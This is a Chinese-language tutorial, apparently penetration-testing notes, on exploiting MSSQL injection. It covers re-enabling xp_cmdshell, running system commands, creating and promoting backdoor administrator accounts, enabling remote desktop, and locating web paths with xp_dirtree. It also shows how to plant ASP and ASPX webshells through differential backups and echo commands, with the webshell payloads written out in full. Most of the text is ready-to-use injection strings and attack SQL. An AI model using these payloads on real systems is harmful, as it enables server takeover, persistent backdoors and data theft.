# 扩展存储过程

## 扩展存储简介

- 在MSSQL注入攻击过程中，最长利用的扩展存储如下：

| 扩展存储过程         | 说明                                                         |
| -------------------- | ------------------------------------------------------------ |
| xp_cmdshell          | 直接执行系统命令                                             |
| sp_OACreate()        | 直接执行系统命令                                             |
| sp_OAMethod()        | 直接执行系统命令                                             |
| xp_regread           | 进行注册表读取                                               |
| xp_regwrite          | 写入到注册表                                                 |
| xp_dirtree           | 进行列目录操作                                               |
| xp_ntsec_enumdomains | 查看domain信息                                               |
| xp_subdirs           | 通过xp_dirtree，xp_subdirs将在一个给定的文件夹中显示所有子文件夹 |

- `xp_cmdshell`详细使用方法：

`xp_cmdshell`默认在**mssql2000**中是开启的，在**mssql2005之后的版本中则默认禁止** 。如果用户拥有管理员**sysadmin** 权限则可以用` sp_configure`重新开启它

```sql
execute('sp_configure "show advanced options",1')  # 将该选项的值设置为1
execute('reconfigure')                             # 保存设置
execute('sp_configure "xp_cmdshell", 1')           # 将xp_cmdshell的值设置为1
execute('reconfigure')                             # 保存设置
execute('sp_configure')                            # 查看配置
execute('xp_cmdshell "whoami"')                    # 执行系统命令

exec sp_configure 'show advanced options',1;       # 将该选项的值设置为1
reconfigure;                                       # 保存设置
exec sp_configure 'xp_cmdshell',1;                 # 将xp_cmdshell的值设置为1
reconfigure;                                       # 保存设置
exec sp_configure;                                 # 查看配置
exec xp_cmdshell 'whoami';                         # 执行系统命令

# 可以执行系统权限之后,前提是获取的主机权限是administrators组里的或者system权限
exec xp_cmdshell 'net user Guest 123456'           # 给guest用户设置密码
exec xp_cmdshell 'net user Guest /active:yes'      # 激活guest用户
exec xp_cmdshell 'net localgroup administrators Guest /add'  # 将guest用户添加到administrators用户组
exec xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'  # 开启3389端口
```

## 扩展存储Getshell

- 条件

1. 数据库是 **db_owner** 权限
2. 扩展存储必须开启，涉及到的的扩展存储过程: xp_cmdshell、 xp_dirtree、 xp_subdirs、 xp_regread

```sql
1.查看是否禁用扩展存储过程xp_cmdshell
id=0 union select 1,2,count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell'--+
id=1 and 1=(select count(*) from master.sys.sysobjects where name='xp_cmdshell')--+

2.执行命令
id=1;exec master.sys.xp_cmdshell 'net user admin Admin@123 /add'--+
id=1;exec master.sys.xp_cmdshell 'net localgroup administrators admin /add'--+
```

# 差异备份GetShell

## 差异备份简介

差异备份数据库得到webshell。在sqlserver里dbo和sa权限都有备份数据库权限，我们可以把数据库备份称asp文件，这样我们就可以通过mssqlserver的备份数据库功能生成一个网页小马。

## 前提条件

- 具有db_owner权限
- 知道web目录的绝对路径

## 寻找绝对路径的方法

- 报错信息
- 字典爆破
- 根据旁站目录进行推测
- 存储过程来搜索

在mssql中有两个存储过程可以帮我们来找绝对路径：`xp_cmdshell xp_dirtree`

先来看`xp_dirtree`直接举例子

```sql
execute master..xp_dirtree 'c:' --列出所有c:\文件、目录、子目录 
execute master..xp_dirtree 'c:',1 --只列c:\目录
execute master..xp_dirtree 'c:',1,1 --列c:\目录、文件
```

当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中

```sql
CREATE TABLE tmp (dir varchar(8000),num int,num1 int);
insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1;
```

当利用`xp_cmdshell`时，其实就是调用系统命令来寻找文件

例如：

```sql
?id=1;CREATE TABLE cmdtmp (dir varchar(8000));
?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (1*.aspx) do @echo %i'
```

- 读配置文件

## 差异备份的大概流程

```sql
1.完整备份一次(保存位置当然可以改)
backup database 库名 to disk = 'c:\ddd.bak';--+

**2.创建表并插入数据** 
create table [dbo].[dtest] ([cmd] [image]);--+
insert into dtest(cmd)values(0x3C25657865637574652872657175657374282261222929253E);--+

**3.进行差异备份** 
backup database 库名 to disk='c:\interub\wwwroot\shell.asp' WITH DIFFERENTIAL,FORMAT;--+

# 上面0x3C25657865637574652872657175657374282261222929253E即一句话木马的内容：<%execute(request("a"))%>
```

# xp_cmdshell GetShell

原理很简单，就是利用系统命令直接像目标网站写入木马

```sql
?id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\WWW\\404.aspx' ;
```

这里要注意 `<`和`>`必须要转义，转义不是使用`\`而是使用`^`

# 文件下载getshell

当我们不知道一些网站绝对路径时，我们可以通过文件下载命令，加载远程的木马文件，或者说`.ps1`脚本，使目标机器成功上线`cs`或者`msf`



